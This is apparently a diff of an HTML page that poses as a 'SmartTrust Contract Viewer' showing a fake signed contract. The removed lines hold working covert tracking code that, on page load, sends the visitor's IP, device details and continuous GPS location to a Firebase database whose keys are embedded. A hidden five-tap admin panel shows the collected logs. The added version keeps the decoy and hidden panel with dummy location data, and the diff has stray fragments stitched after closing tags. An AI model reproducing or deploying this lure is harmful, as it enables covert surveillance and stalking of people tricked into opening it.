@@ -1,265 +1,76 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><html lang="en">
 <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>SmartTrust Contract Viewer</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background-color: #f5f7fa;
-      color: #333;
+      background: #111;
+      color: #fff;
     }
-
-    .header {
-      background-color: #2e86de;
-      color: white;
-      padding: 1rem;
-      text-align: center;
-    }
-
-    .viewer {
-      background: white;
-      margin: 20px;
-      border-radius: 8px;
-      padding: 1rem;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      height: 60vh;
-      overflow-y: auto;
-      position: relative;
-    }
-
-    .loading {
-      display: none;
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      font-size: 1.2rem;
-      color: #2e86de;
-    }
-
-    .footer {
-      text-align: center;
-      font-size: 0.9rem;
-      color: #aaa;
-      padding: 1rem;
-    }
-
-    /* Hidden Admin Panel */
-    #adminPanel {
-      display: none;
-      background: #000;
-      color: white;
-      padding: 20px;
-      height: 100vh;
-      overflow-y: auto;
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      z-index: 999;
-    }
-
-    #adminPanel table {
-      width: 100%;
-      margin-top: 20px;
-      border-collapse: collapse;
-    }
-
-    #adminPanel th, #adminPanel td {
-      border: 1px solid #ccc;
-      padding: 8px;
-      font-size: 14px;
-    }
-
-    #adminPanel h2 {
-      color: #00ffcc;
-    }
-
-    .hidden-button {
-      width: 100%;
-      height: 20px;
-      opacity: 0;
-      position: absolute;
-      top: 0;
-      left: 0;
-      z-index: 9999;
-    }
-  </style>
-</head>
-<body>
-
-<div class="header">
-  <h1>SmartTrust Contract Viewer</h1>
-</div>
-
-<div class="viewer" id="viewer">
-  <div class="loading" id="loading">Loading contract document...</div>
-  <p><strong>Document:</strong> SC-024/NGX-CON</p>
-  <p><strong>Status:</strong> Active</p>
-  <p><strong>Issued by:</strong> National Blockchain Governance Unit</p>
-  <p><strong>Effective Date:</strong> August 1, 2025</p>
-  <p><strong>Parties:</strong> GlobalChain Inc. and SmartCheck Solutions</p>
-  <p><strong>Content Preview:</strong></p>
-  <p>This Contract Agreement ("Agreement") is entered into between GlobalChain Inc. and SmartCheck Solutions...</p>
-  <p>Section 1: Terms & Conditions...</p>
-  <p>Section 2: Payment Schedule...</p>
-  <p>Section 3: Liability Clause...</p>
-  <p>Section 4: Signature Authorization...</p>
-  <p>[Digital Signature Verified ✅]</p>
-</div>
-
-<div class="footer">© 2025 SmartTrust. All rights reserved.</div>
-
-<!-- Invisible Tap Trigger -->
-<div class="hidden-button" id="tapArea"></div>
-
-<!-- Admin Panel -->
-<div id="adminPanel">
-  <h2>Admin Panel - Logs</h2>
-  <table>
-    <thead>
-      <tr><th>IP</th><th>Device</th><th>Browser</th><th>Time</th></tr>
-    </thead>
-    <tbody id="logTable">
-      <tr><td colspan="4">Loading logs...</td></tr>
-    </tbody>
-  </table>
-</div>
-
-<!-- Firebase SDK -->
-<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
-
-<script>
-  // Your Firebase config
-  const firebaseConfig = {
-    apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
-    authDomain: "gps-d0bab.firebaseapp.com",
-    databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
-    projectId: "gps-d0bab",
-    storageBucket: "gps-d0bab.appspot.com",
-    messagingSenderId: "810816177909",
-    appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
-  };
-
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.database();
-
-  // Fingerprint / IP Log
-  async function logUser() {
-    try {
-      const res = await fetch('https://api.ipify.org?format=json');
-      const ipData = await res.json();
-      const userAgent = navigator.userAgent;
-      const time = new Date().toLocaleString();
-      const logRef = db.ref('fingerprints').push();
-      await logRef.set({
-        ip: ipData.ip,
-        device: navigator.platform,
-        browser: userAgent,
-        time: time
-      });
-    } catch (e) {
-      console.error('Logging failed:', e);
-    }
-  }
-
-  // Load Admin Logs
-  function loadAdminLogs() {
-    const logTable = document.getElementById('logTable');
-    db.ref('fingerprints').once('value', snapshot => {
-      let html = "";
-      snapshot.forEach(child => {
-        const data = child.val();
-        html += `<tr>
-          <td>${data.ip || ''}</td>
-          <td>${data.device || ''}</td>
-          <td>${data.browser?.slice(0, 30) || ''}</td>
-          <td>${data.time || ''}</td>
-        </tr>`;
-      });
-      logTable.innerHTML = html || '<tr><td colspan="4">No logs yet</td></tr>';
-    });
-  }
-
-  // Admin unlock logic
-  let tapCount = 0;
-  const tapArea = document.getElementById('tapArea');
-  tapArea.addEventListener('click', () => {
-    tapCount++;
-    if (tapCount >= 5) {
-      tapCount = 0;
-      document.getElementById('adminPanel').style.display = 'block';
-      loadAdminLogs();
-    }
-    setTimeout(() => { tapCount = 0; }, 3000);
-  });
-
-  // Simulate loading
-  document.getElementById("loading").style.display = "block";
-  setTimeout(() => {
-    document.getElementById("loading").style.display = "none";
-  }, 2000);
-
-  logUser();
-</script>
-</body>
-</html>    }
-    .loading span {
-      display: inline-block;
-      width: 10px;
-      height: 10px;
+    header {
       background: #00ffcc;
-      margin: 0 3px;
-      animation: bounce 1.2s infinite ease-in-out;
+      color: #000;
+      padding: 15px 20px;
+      font-size: 22px;
+      font-weight: bold;
     }
-    .loading span:nth-child(2) { animation-delay: -1.1s; }
-    .loading span:nth-child(3) { animation-delay: -1.0s; }
-
-    @keyframes bounce {
-      0%, 80%, 100% { transform: scale(0); }
-      40% { transform: scale(1.0); }
+    .tabs {
+      display: flex;
+      background: #222;
+      padding: 10px;
+      justify-content: space-around;
     }
-
-    footer {
-      text-align: center;
-      padding: 15px;
-      color: #aaa;
-      font-size: 14px;
+    .tab {
+      background: #333;
+      color: #fff;
+      padding: 10px 20px;
+      cursor: pointer;
+      border-radius: 5px;
     }
-
-    .admin-panel {
-      display: none;
-      background: #000;
+    .tab.active {
+      background-color: #00ffcc;
+      color: #000;
+    }
+    .content {
       padding: 20px;
-      overflow-y: auto;
+    }
+    .footer {
+      padding: 20px;
+      font-size: 12px;
+      background: #000;
+      text-align: center;
+      color: #666;
+    }
+    .admin-panel {
       position: fixed;
       top: 0;
       left: 0;
-      height: 100%;
-      width: 100%;
+      width: 100vw;
+      height: 100vh;
+      background: #000000ee;
+      display: none;
+      flex-direction: column;
+      color: white;
+      padding: 20px;
+      overflow-y: auto;
       z-index: 9999;
     }
-
-    .admin-panel h2 {
-      color: #00ffcc;
-      margin-top: 0;
-    }
-
     .admin-panel table {
       width: 100%;
-      border-collapse: collapse;
       margin-top: 20px;
+      border-collapse: collapse;
       font-size: 14px;
     }
-
-    .admin-panel th, .admin-panel td {
+    .admin-panel table, th, td {
       border: 1px solid #888;
       padding: 8px;
     }
-
+    .admin-panel h2 {
+      color: #00ffcc;
+    }
     .btn {
       background: #00ffcc;
       color: #000;
@@ -268,203 +79,90 @@
       margin: 10px 5px;
       cursor: pointer;
     }
-
-    .logo {
-      width: 160px;
-      margin: 20px auto;
-      display: block;
-    }
-
-    .fake-doc {
-      background: #222;
-      padding: 15px;
-      margin-top: 20px;
-      border-left: 5px solid #00ffcc;
-    }
-
   </style>
 </head>
 <body>
-  <header>
-    SmartTrust Contract Viewer
-  </header>
-
-  <img src="https://i.ibb.co/4TPZD9j/smarttrust-logo.png" alt="SmartTrust Logo" class="logo"/>
-
+  <header id="tapArea">SmartTrust Contract Viewer</header>
   <div class="tabs">
-    <div>Contract A</div>
-    <div>Contract B</div>
-    <div>Legal Info</div>
+    <div class="tab active">Contract A</div>
+    <div class="tab">Contract B</div>
+    <div class="tab">Legal Info</div>
   </div>
-
-  <div class="content" onclick="tapCounter()">
-    <div class="loading">
-      <p>Loading contract document...</p>
-      <span></span><span></span><span></span>
-    </div>
-
-    <div class="fake-doc">
-      <h3>Document: SC-024/NGX-CON</h3>
-      <p><strong>Status:</strong> Active</p>
-      <p><strong>Issued by:</strong> National Blockchain Governance Unit</p>
-      <p><strong>Effective Date:</strong> August 1, 2025</p>
-      <p><strong>Parties:</strong> GlobalChain Inc. and SmartCheck Solutions</p>
-
-      <p><strong>Content Preview:</strong><br>
-        This Contract Agreement ("Agreement") is entered into between GlobalChain Inc. and SmartCheck Solutions...
-        <br><br>
-        Section 1: Terms & Conditions...<br>
-        Section 2: Payment Schedule...<br>
-        Section 3: Liability Clause...<br>
-        Section 4: Signature Authorization...<br><br>
-        <strong>[Digital Signature Verified ✅]</strong>
-      </p>
-    </div>
+  <div class="content">
+    <h2>Document: SC-024/NGX-CON</h2>
+    <p><strong>Status:</strong> Active</p>
+    <p><strong>Issued by:</strong> National Blockchain Governance Unit</p>
+    <p><strong>Effective Date:</strong> August 1, 2025</p>
+    <p><strong>Parties Involved:</strong> GlobalChain Inc. and SmartCheck Solutions</p>
+    <p><strong>Content Preview:</strong></p>
+    <ul>
+      <li>Section 1: Terms & Conditions...</li>
+      <li>Section 2: Payment Schedule...</li>
+      <li>Section 3: Liability Clause...</li>
+      <li>Section 4: Signature Authorization...</li>
+    </ul>
+    <p>[Digital Signature Verified ✅]</p>
+    <p>This app lets you preview digital contracts and agreements for legal purposes.</p>
   </div>
-
-  <div class="admin-panel" id="adminPanel">
+  <div class="footer">
+    SmartTrust Technologies Ltd. &copy; 2025. All rights reserved.<br>
+    <small>Last seen: <span id="lastSeen"></span></small>
+  </div>  <div id="adminPanel" class="admin-panel">
     <h2>Admin Panel – Location Logs</h2>
     <button class="btn" onclick="clearLogs()">🗑 Clear Logs</button>
     <button class="btn" onclick="exportCSV()">📁 Export CSV</button>
-
     <table id="logTable">
-      <tr>
-        <th>Time</th>
-        <th>Lat</th>
-        <th>Lng</th>
-        <th>Speed</th>
-        <th>Direction</th>
-        <th>Device</th>
-        <th>Map</th>
-      </tr>
+      <thead>
+        <tr><th>Time</th><th>Lat</th><th>Lng</th><th>Speed</th><th>Direction</th><th>Device</th><th>Map</th></tr>
+      </thead>
+      <tbody></tbody>
     </table>
-  </div>
+  </div>  <script>
+    // Last seen
+    document.getElementById("lastSeen").textContent = new Date().toLocaleString();
 
-  <footer>
-    &copy; 2025 SmartTrust. All rights reserved.
-  </footer>
+    // Tap to reveal admin panel
+    let tapCount = 0;
+    let tapTimer;
+    document.getElementById("tapArea").addEventListener("click", function() {
+      tapCount++;
+      clearTimeout(tapTimer);
+      tapTimer = setTimeout(() => tapCount = 0, 1000);
+      if (tapCount === 5) {
+        document.getElementById("adminPanel").style.display = "flex";
+      }
+    });
 
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-
-  <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
-      authDomain: "gps-d0bab.firebaseapp.com",
-      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
-      projectId: "gps-d0bab",
-      storageBucket: "gps-d0bab.appspot.com",
-      messagingSenderId: "810816177909",
-      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
-    };
-
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-
-    function logData(data) {
-      const timestamp = new Date().toISOString();
-      firebase.database().ref('logs').push({ timestamp, ...data });
-    }
-
-    // Fingerprint + IP logging
-    fetch("https://api.ipify.org?format=json")
-      .then(res => res.json())
-      .then(data => {
-        logData({
-          ip: data.ip,
-          userAgent: navigator.userAgent,
-          platform: navigator.platform
-        });
-      });
-
-    // Location logging
-    if (navigator.geolocation) {
-      navigator.geolocation.watchPosition(pos => {
-        const { latitude, longitude, speed, heading } = pos.coords;
-        logData({ latitude, longitude, speed, heading });
-        addLogRow(latitude, longitude, speed, heading);
-      });
-    }
-
-    function addLogRow(lat, lng, speed, heading) {
-      const table = document.getElementById("logTable");
-      const row = table.insertRow(-1);
-      row.innerHTML = `
-        <td>${new Date().toLocaleString()}</td>
-        <td>${lat}</td>
-        <td>${lng}</td>
-        <td>${speed || "0"}</td>
-        <td>${heading || "N/A"}</td>
-        <td>${navigator.userAgent}</td>
-        <td><a href="https://maps.google.com/?q=${lat},${lng}" target="_blank">📍</a></td>
-      `;
-    }
+    // Dummy logs for testing
+    const logs = [
+      { time: '2025-08-01 22:45', lat: '9.0820', lng: '8.6753', speed: '0 km/h', dir: 'N/A', dev: 'Android' },
+      { time: '2025-08-01 23:10', lat: '9.0831', lng: '8.6740', speed: '3 km/h', dir: 'North', dev: 'Android' }
+    ];
+    const tableBody = document.querySelector("#logTable tbody");
+    logs.forEach(log => {
+      const row = document.createElement("tr");
+      row.innerHTML = `<td>${log.time}</td><td>${log.lat}</td><td>${log.lng}</td><td>${log.speed}</td><td>${log.dir}</td><td>${log.dev}</td><td><a href="https://www.google.com/maps?q=${log.lat},${log.lng}" target="_blank">📍</a></td>`;
+      tableBody.appendChild(row);
+    });
 
     function clearLogs() {
-      firebase.database().ref('logs').remove();
-      document.getElementById("logTable").innerHTML = `
-        <tr>
-          <th>Time</th><th>Lat</th><th>Lng</th><th>Speed</th><th>Direction</th><th>Device</th><th>Map</th>
-        </tr>`;
+      tableBody.innerHTML = '';
     }
 
     function exportCSV() {
-      let csv = "Time,Lat,Lng,Speed,Direction,Device\n";
-      document.querySelectorAll("#logTable tr").forEach((row, i) => {
-        if (i === 0) return; // skip header
-        const cols = row.querySelectorAll("td");
-        if (cols.length) {
-          csv += [...cols].slice(0, 6).map(td => td.innerText).join(",") + "\n";
-        }
+      let csv = 'Time,Lat,Lng,Speed,Direction,Device\n';
+      logs.forEach(l => {
+        csv += `${l.time},${l.lat},${l.lng},${l.speed},${l.dir},${l.dev}\n`;
       });
-      const blob = new Blob([csv], { type: "text/csv" });
+      const blob = new Blob([csv], { type: 'text/csv' });
       const url = URL.createObjectURL(blob);
-      const a = document.createElement("a");
+      const a = document.createElement('a');
       a.href = url;
-      a.download = "logs.csv";
+      a.download = 'location_logs.csv';
       a.click();
     }
-
-    // Hidden 5x tap for admin panel
-    let tapCount = 0;
-    function tapCounter() {
-      tapCount++;
-      if (tapCount >= 5) {
-        document.getElementById("adminPanel").style.display = "block";
-        tapCount = 0;
-      }
-    }
-  </script>
-</body>
-</html>      cursor: pointer;
-      border-radius: 5px;
-    }
-    .tab.active {
-      background-color: #2e86de;
-      color: white;
-    }
-    .viewer {
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 0 8px rgba(0,0,0,0.1);
-      padding: 1rem;
-      height: 60vh;
-      overflow-y: auto;
-      position: relative;
-    }
-    iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
-    }
-    .loading {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      font-size: 1rem;
-      color: #2e86de;
+  </script></body>
+  </html>      color: #2e86de;
       display: none;
     }
     .footer {
